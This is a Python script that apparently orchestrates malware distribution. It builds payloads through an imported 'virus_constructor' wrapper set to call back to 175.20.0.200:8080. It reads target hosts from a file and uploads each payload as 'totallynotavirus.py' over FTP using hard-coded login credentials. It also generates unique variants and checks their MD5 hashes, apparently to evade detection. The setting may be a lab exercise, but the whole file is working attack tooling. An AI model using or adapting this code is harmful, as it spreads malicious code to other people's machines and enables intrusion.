from ftplib import FTP
import io
import os
import hashlib
#import brain.mount.virus_constructor as vc
# import virus_constructor as vc
from virus_constructor import wrapper, reseed


file = str(wrapper("175.20.0.200", "8080"))
print(file)
#file = "print('Hello World!!')"
#print(file)




def uploadFile(ftp,filename,data):
    #I changed to using strings to send data because you will be
    #making your virus as a string and there is no need to save it to
    #a file locally just to send
    ftp.storbinary('STOR ' + filename, io.BytesIO(data.encode()))


def send_it():
    targets=[]
    f=open("/root/brain/targets.txt","r")
    for l in f.readlines():
        targets.append(l.strip())
    f.close()
        
    print("Brain started")
    for t in targets:
        print ("Sending test file to %s"%t)
        ftp = FTP('')
        ftp.connect(t, 21)
        ftp.login('user', '12345')
        uploadFile(ftp,"totallynotavirus.py", file)
        # uploadFile(ftp,"totallynotavirus.py",
        ftp.quit()
        # ftp.cwd('/home/username')  # directory for shenanigans
        # ftp.retrlines('LIST')


def originality_check(hash_to_check, counter=0) -> bool:
    filename = "/root/mount/filehashes2.txt"
    # print(hash_to_check)
    if counter == 0:
        with open(filename, 'w+') as file:
            file.write(f'{hash_to_check}\n')
            return(True)
    else: 
        with open(filename, 'r+') as file:
            for line in file:
                if hash_to_check in line:
                    return(False)
                else:
                    file.write(f'{hash_to_check}\n')
                    return(True)


# def downloadFile():
#     filename: str = 'testfile.txt'  # replace with download file
#     localFile = open(filename, 'wb')
#     ftp.retrbinary('RETR ' + filename, localFile.write, 1024)
#     ftp.quit()
#     localFile.close()


if __name__ == '__main__':
#     uploadFile()
#     # downloadFile()
    reseed()
    from sys import argv
    if len(argv) == 2:
            for i in range(0, int(argv[1])):
                x = wrapper("175.20.0.200", "8080")
                # print(x)
                y = str(hashlib.md5(x.encode("ascii")).hexdigest())
                print(y)
                if originality_check(y, i):
                    send_it()
    else:
        x = wrapper("175.20.0.200", "8080")
        # print(x)
        y = str(hashlib.md5(x.encode("ascii")).hexdigest())
        print(y)
        if originality_check(y):
            send_it()



#Commented out for now
